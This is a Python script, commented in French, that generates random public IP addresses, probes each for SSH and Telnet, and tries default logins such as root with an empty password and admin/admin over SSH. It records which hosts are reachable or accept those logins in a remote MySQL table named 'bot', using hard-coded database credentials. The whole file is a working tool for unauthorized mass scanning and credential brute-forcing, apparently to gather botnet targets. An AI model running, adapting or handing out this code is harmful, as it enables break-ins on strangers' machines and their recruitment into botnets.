import mysql.connector
from mysql.connector import Error
import socket
import random
import paramiko

# Fonction pour vérifier si une adresse IP est dans une plage réservée
def is_reserved_ip(ip):
    octets = tuple(int(octet) for octet in ip.split('.'))
    if (octets[0] == 10 or
        (octets[0] == 172 and 16 <= octets[1] <= 31) or
        (octets[0] == 192 and octets[1] == 168) or
        (224 <= octets[0] <= 239) or
        (octets[0] == 127) or
        (octets[0] == 192 and octets[1] == 0 and octets[2] == 2) or
        (octets[0] == 198 and octets[1] == 51 and octets[2] == 100) or
        (octets[0] == 203 and octets[1] == 0 and octets[2] == 113)):
        return True
    return False

# Fonction pour générer une adresse IP publique aléatoire
def generate_public_ip():
    while True:
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        if not is_reserved_ip(ip):
            return ip

# Fonction pour vérifier les services SSH et Telnet et tenter une connexion SSH
def check_services(ip):
    services = {'ssh': 'non', 'telnet': 'non', 'vul': 'non'}
    credentials = [('root', ''), ('root', 'root'), ('admin', 'admin'), ('admin', '')]
    for port in [22, 23]:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)
            if s.connect_ex((ip, port)) == 0:
                if port == 22:
                    services['ssh'] = 'oui'
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    for username, password in credentials:
                        try:
                            ssh.connect(ip, username=username, password=password, timeout=1)
                            services['vul'] = 'oui'
                            ssh.close()
                            break
                        except:
                            continue
                elif port == 23:
                    services['telnet'] = 'oui'
                    services['vul'] = 'oui'  # Telnet est considéré comme vulnérable par défaut
    return services

# Fonction principale qui inclut la connexion à la base de données et la logique de vérification
def main():
    conn = None
    try:
        conn = mysql.connector.connect(host="109.234.166.240", user="peca7252_bot", password="yanissaid", database="peca7252_eva")
        if conn.is_connected():
            cursor = conn.cursor()
            for _ in range(100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):  # Modifier pour ajuster le nombre d'itérations
                ip = generate_public_ip()
                services = check_services(ip)
                if services['ssh'] == 'oui' or services['telnet'] == 'oui':
                    service = 'ssh' if services['ssh'] == 'oui' else 'telnet'
                    vul = services['vul']
                    region = "FR"  # Exemple de région, ajuster selon les besoins
                    sql = "INSERT INTO bot (ip, service, vul, region) VALUES (%s, %s, %s, %s)"
                    val = (ip, service, vul, region)
                    cursor.execute(sql, val)
                    conn.commit()
                    print(f"Enregistrement inséré pour l'IP {ip} - Service: {service}, Vulnérable: {vul}.")
    except Error as e:
        print(f"Erreur lors de la connexion à MySQL: {e}")
    finally:
        if conn is not None and conn.is_connected():
            conn.close()
            print("Connexion à MySQL fermée.")

main()  # Exécuter la fonction principale
